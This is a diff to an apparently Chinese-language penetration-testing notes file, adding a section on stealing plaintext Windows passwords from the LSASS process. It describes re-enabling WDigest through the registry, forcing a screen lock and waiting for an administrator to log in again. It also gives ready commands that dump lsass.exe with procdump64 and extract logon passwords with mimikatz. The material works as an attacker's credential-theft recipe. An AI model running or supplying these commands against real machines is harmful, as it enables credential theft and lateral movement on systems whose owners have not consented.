@@ -52,8 +52,34 @@ ntdsutil snapshot "delete GUID" quit quit
 ntdsutil snapshot "List All" quit quit
 ntdsutil snapshot "List Mounted" quit quit
  ```
-### 
-## 0x02 主机获取Hash
+## 0x02 主机获取密码
+
+### 获取明文密码
+
+>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
+当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。
+但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）
+
+以下是支持的系统:
+Windows 7
+Windows 8
+Windows 8.1
+Windows Server 2008
+Windows Server 2012
+Windows Server 2012R 2
+
+- 原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码
+利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。
+抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码
+
+procdump64.exe导出lsass.dmp
+```
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+```
+使用本地的mimikatz.exe读取lsass.dmp
+```
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"
+```
 
 ## 0x03 破解 Hash 
 >强力推荐
@@ -64,3 +90,4 @@ ntdsutil snapshot "List Mounted" quit quit
 ## Ref
 
 - https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 
+- https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html
